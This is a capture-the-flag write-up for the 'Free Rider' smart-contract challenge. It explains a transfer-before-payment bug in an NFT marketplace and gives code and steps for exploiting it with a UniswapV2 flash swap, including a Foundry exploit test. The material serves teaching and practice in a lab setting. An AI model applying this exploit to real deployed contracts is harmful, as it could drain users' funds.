## Free Rider solution

"If only you could get free ETH, at least for an instant." And we could, indeed!

But first, let's look at the code. It has two main functions for offering and buying NFTs. There are 6 NFTs already offered at the price of 15 ETH each. What we are interested in is how the buy function handles ETH transfer. It seems that whoever the owner of the NFT receives payment. 

```
// pay seller using cached token
        payable(_token.ownerOf(tokenId)).sendValue(priceToPay);
```
However, if we look just above this line we see that the NFT transfer happens before the actual payment! Which practically means that the buyer of the NFT gets refunded with the ETH he sent. And in that case we would only need 15 ETH to get all the NFTs offered.

```
        // transfer from seller to buyer
        DamnValuableNFT _token = token; // cache for gas savings
        _token.safeTransferFrom(_token.ownerOf(tokenId), msg.sender, tokenId);

        // pay seller using cached token
        payable(_token.ownerOf(tokenId)).sendValue(priceToPay);
```

So, how do we obtain 15 ETH? Obviously, using a flashloan. UniswapV2 offers something called a `flashswap` within its `swap`function in the `Pair` contract. It allows one to utilize flashloan functionality using the same function for swaps. The only thing required for borrower is to pass any data when calling the `swap` function and implement `IUniswapV2Callee` interface with `uniswapV2Call` function, which will receive the flashloan. Here we will code the logic desired:

1. We are taking the flashloan in WETH, so we need to withdraw it for ETH first
    `weth.withdraw(amount1);`
2. Then we call `buyMany` function, sending the amount borrowed (15 ETH) and passing in an array of `tokenIds`
    `marketplace.buyMany{value: amount1}(tokenIds);`
3. Since NFTs are sent via the `safeTransferFrom` function, we would also need to implement `IERC721Receiver` interface and return this magic value on each NFT trasfered: `IERC721Receiver.onERC721Received.selector`
4. Then we transfer out NFTs to the recovery contract to get our bounty. Here we need to specify the data parameter for `safeTransferFrom` function. It would be the same one with which we called the `swap` function
    ```
    for (uint256 i; i < tokenIds.length; ++i) {
            marketplace.token().safeTransferFrom(
                address(this),
                address(recovery),
                i,
                data
            );
        }
    ```
5. Finally, we deposit our ETH to WETH contract and send back the WETH to `Pair` conract plus small fee.

So, is the bounty in our contract? Actually, no. The `data` parameter with which it all started contains the address where we want to receive the bounty as per this requirement in the `recovery` contract.
```
if (++received == 6) {
            address recipient = abi.decode(_data, (address));
            payable(recipient).sendValue(PRIZE);
        }
```

Overall, a test would look something like this:
```
    function testExploit() public {
        vm.startPrank(attacker, attacker);
        // Send a small amount of ETH to pay for fee later
        flashSwap = new FlashSwap{value: 0.01 ether}(
            payable(address(marketplace)),
            address(recovery),
            payable(address(uniswapV2Pair)),
            payable(address(weth))
        );
        vm.label(address(flashSwap), "FlashSwap contract");

        // Define data so that UniswapV2Pair.swap() could perform flashswap
        // Data must be attacker's address so that we can get the bounty
        bytes memory data = abi.encode(attacker);

        // Perform a flashswap
        uniswapV2Pair.swap(0, 15 ether, address(flashSwap), data);
        vm.stopPrank();
        validation();
    }
```

Once again we learnt that code must adhere to Checks-Effects-Interactions pattern. In this particular case payment should have preceded the token transfer.